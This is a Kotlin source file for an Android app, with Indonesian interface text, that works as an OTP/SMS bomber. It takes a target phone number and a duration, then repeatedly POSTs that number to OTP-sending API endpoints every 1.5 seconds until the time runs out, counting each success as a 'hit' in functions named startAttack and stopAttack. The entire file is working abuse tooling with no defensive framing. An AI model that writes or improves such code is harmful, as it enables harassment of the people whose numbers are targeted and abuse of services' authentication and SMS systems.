package com.otax.virtex

import android.graphics.Color
import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    private lateinit var etNumber: EditText
    private lateinit var etDuration: EditText
    private lateinit var btnStart: Button
    private lateinit var tvLog: TextView
    
    private var isRunning = false
    private var attackJob: Job? = null

    private val otpEndpoints = listOf(
        "https://api.layanana.com/v1/auth/otp",
        "https://api.layananb.com/v2/send-otp"
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        etNumber = findViewById(R.id.etNumber)
        etDuration = findViewById(R.id.etDuration)
        btnStart = findViewById(R.id.btnStart)
        tvLog = findViewById(R.id.tvLog)

        btnStart.setOnClickListener {
            if (!isRunning) startAttack() else stopAttack()
        }
    }

    private fun startAttack() {
        val number = etNumber.text.toString()
        val durationText = etDuration.text.toString()

        if (number.isEmpty() || durationText.isEmpty()) {
            Toast.makeText(this, "Isi nomor dan durasi!", Toast.LENGTH_SHORT).show()
            return
        }

        val durationMinutes = durationText.toIntOrNull() ?: 0
        if (durationMinutes <= 0) return

        isRunning = true
        btnStart.text = "STOP"
        btnStart.setBackgroundColor(Color.parseColor("#FF0055"))
        tvLog.text = "Menyerang $number..."

        val client = OkHttpClient.Builder().connectTimeout(5, TimeUnit.SECONDS).build()
        val jsonMediaType = "application/json; charset=utf-8".toMediaType()

        attackJob = CoroutineScope(Dispatchers.IO).launch {
            val endTime = System.currentTimeMillis() + (durationMinutes * 60000)
            var hitCount = 0

            while (System.currentTimeMillis() < endTime && isRunning) {
                val endpoint = otpEndpoints.random()
                val jsonPayload = "{\"phone\": \"$number\"}"
                val body = jsonPayload.toRequestBody(jsonMediaType)

                val request = Request.Builder().url(endpoint).post(body).build()

                try {
                    val response = client.newCall(request).execute()
                    if (response.isSuccessful) {
                        hitCount++
                        runOnUiThread { tvLog.text = "Hit #$hitCount Berhasil!" }
                    }
                } catch (e: Exception) {}
                delay(1500)
            }
            runOnUiThread {
                stopAttack()
                tvLog.text = "Selesai! Total: $hitCount"
            }
        }
    }

    private fun stopAttack() {
        isRunning = false
        attackJob?.cancel()
        btnStart.text = "EXECUTE"
        btnStart.setBackgroundColor(Color.parseColor("#00FF88"))
    }
}
